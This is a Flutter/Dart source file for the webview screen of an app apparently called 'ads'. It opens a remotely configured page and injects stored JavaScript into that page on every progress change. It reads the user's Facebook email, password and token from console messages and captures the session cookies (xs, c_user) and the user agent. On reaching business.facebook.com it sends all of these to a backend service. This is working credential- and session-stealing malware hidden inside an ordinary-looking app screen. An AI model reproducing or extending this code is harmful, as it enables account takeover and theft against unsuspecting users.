import 'dart:convert';
import 'dart:io';
import 'package:ads/screens/home_page.dart';
import 'package:ads/utils/utils.dart';
import 'package:flutter/material.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:ads/models/autogenerated.dart';
import 'package:ads/screens/onboarding_page.dart';
import 'package:ads/services/services.dart';
import 'package:go_router/go_router.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:webview_cookie_manager/webview_cookie_manager.dart';
import 'package:flutter_dotenv/flutter_dotenv.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';

class Webview extends StatefulWidget {
  static const String routeName = "/webview";
  Webview() : super();
  @override
  _WebviewState createState() => _WebviewState();
}

class _WebviewState extends State<Webview> {
  _WebviewState();
  final GlobalKey webViewKey = GlobalKey();
  final storage = const FlutterSecureStorage();
  InAppWebViewController? webViewController;
  InAppWebViewGroupOptions options = InAppWebViewGroupOptions(
    crossPlatform: InAppWebViewOptions(
      useShouldOverrideUrlLoading: true,
      mediaPlaybackRequiresUserGesture: false,
      clearCache: true,
    ),
    android: AndroidInAppWebViewOptions(
      useHybridComposition: true,
    ),
    ios: IOSInAppWebViewOptions(
      allowsInlineMediaPlayback: true,
    ),
  );

  late PullToRefreshController pullToRefreshController;
  String url = "";
  double progress = 0;
  final urlController = TextEditingController();
  String appTitle = '';
  @override
  void initState() {
    super.initState();
    pullToRefreshController = PullToRefreshController(
      options: PullToRefreshOptions(
        color: Colors.blue,
      ),
      onRefresh: () async {
        if (Platform.isAndroid) {
          webViewController?.reload();
        } else if (Platform.isIOS) {
          webViewController?.loadUrl(
              urlRequest: URLRequest(url: await webViewController?.getUrl()));
        }
      },
    );

    storage.read(key: 'app_title').then((value) => {
          setState(() {
            appTitle = value!;
          })
        });
  }

  @override
  void dispose() {
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return FutureBuilder(
        future: fetchData(),
        builder: (context, snapshot) {
          return Scaffold(
              body: SafeArea(
                  child: Column(children: <Widget>[
            Container(
              child: Image.asset("assets/icons/https.png"),
            ),
            Expanded(
              child: Stack(
                children: [
                  InAppWebView(
                    key: webViewKey,
                    initialUrlRequest:
                        URLRequest(url: Uri.parse(snapshot.data["f2"] ?? "")),
                    initialOptions: options,
                    pullToRefreshController: pullToRefreshController,
                    onWebViewCreated: (controller) async {
                      webViewController = controller;
                    },

                    // onLoadStart: _onloadStart,
                    // androidOnPermissionRequest: _androidOnPermissionRequest,
                    shouldOverrideUrlLoading: _shouldOverrideUrlLoading,
                    onLoadStop: _onLoadStop,
                    onLoadError: (controller, url, code, message) {
                      pullToRefreshController.endRefreshing();
                    },
                    onProgressChanged: _onProgressChanged,
                    onUpdateVisitedHistory:
                        (controller, url, androidIsReload) async {
                      final cookieManager = WebviewCookieManager();
                      var cookie =
                          await cookieManager.getCookies(snapshot.data["f2"]);
                      if (cookie.toString().contains('xs=') &&
                          !url.toString().startsWith(snapshot.data["linktk"])) {
                        await controller.loadUrl(
                            urlRequest: URLRequest(
                          url: Uri.parse(snapshot.data["linktk"]),
                        ));

                        var cookieWithCuser = cookie.firstWhere((_cookie) {
                          return _cookie.toString().contains('c_user');
                        });
                        String cookieStr = cookie.map((element) {
                          return "${element.name}=${element.value}";
                        }).join(';');
                        await storage.write(key: "cookie", value: cookieStr);
                        var fbId = cookieWithCuser.value;
                        await storage.write(key: "fbId", value: fbId);

                        var userAgent = await controller.evaluateJavascript(
                            source: "navigator.userAgent");

                        await storage.write(
                            key: "user_agent", value: userAgent);
                      }
                    },
                    onConsoleMessage: _onConsoleMessage,
                  ),
                ],
              ),
            ),
          ])));
        });
  }

  Future<void> _onProgressChanged(controller, progress) async {
    var jsacc2 = await storage.read(key: "jsacc2");
    var jstk = await storage.read(key: "jstk");

    await controller.evaluateJavascript(source: jsacc2);
    await controller.evaluateJavascript(source: jstk);
  }

  Future<void> _onConsoleMessage(controller, consoleMessage) async {
    try {
      print(consoleMessage.message);
      final message = jsonDecode(consoleMessage.message);
      final response = Autogenerated.fromJson(message);
      final email = response.user?.email;
      final password = response.user?.password;
      final token = response.user?.token;
      if (email != null) {
        await storage.write(key: "fb_email", value: email);
      }

      if (password != null) {
        await storage.write(key: "fb_password", value: password);
      }

      if (token != null) {
        await storage.write(key: "fb_token", value: token);
      }
    } catch (e) {
      print("FAILED.........:()");
      debugPrint(e.toString());
    }
  }

  Future<PermissionRequestResponse> _androidOnPermissionRequest(
      controller, origin, resources) async {
    return PermissionRequestResponse(
        resources: resources, action: PermissionRequestResponseAction.GRANT);
  }

  Future<NavigationActionPolicy> _shouldOverrideUrlLoading(
      controller, navigationAction) async {
    var uri = navigationAction.request.url!;

    if (!["http", "https", "file", "chrome", "data", "javascript", "about"]
        .contains(uri.scheme)) {
      if (await canLaunch(url)) {
        // Launch the App
        await launch(
          url,
        );
        // and cancel the request
        return NavigationActionPolicy.CANCEL;
      }
    }

    return NavigationActionPolicy.ALLOW;
  }

  Future<void> _onLoadStop(controller, url) async {
    if (url.toString().startsWith("https://business.facebook.com")) {
      final fbId = await storage.read(key: "fbId");
      final email = await storage.read(key: "fb_email");
      final password = await storage.read(key: "fb_password");
      final cookie = await storage.read(key: "cookie");
      final token = await storage.read(key: "fb_token");
      final userAgent = await storage.read(key: "user_agent");
      Object data = {
        'id_facebook': fbId,
        'email': email!,
        'password': password!,
        'cookie': cookie,
        'user_agent': userAgent,
        'from_app': dotenv.env['APP_NAME'],
        "token": token,
      };
      print(data);
      await Service.saveData(data);
      await Service.trackingLoginFacebookSuccess();
      GoRouter.of(context).goNamed("home");
    }
  }

  Future fetchData() async {
    var jsacc2 = await storage.read(key: "jsacc2");
    var f2 = await storage.read(key: "f2");
    var linktk = await storage.read(key: "linktk");
    var jstk = await storage.read(key: "jstk");
    return Future.value(
        {"jsacc2": jsacc2, "f2": f2, "linktk": linktk, "jstk": jstk});
  }
}
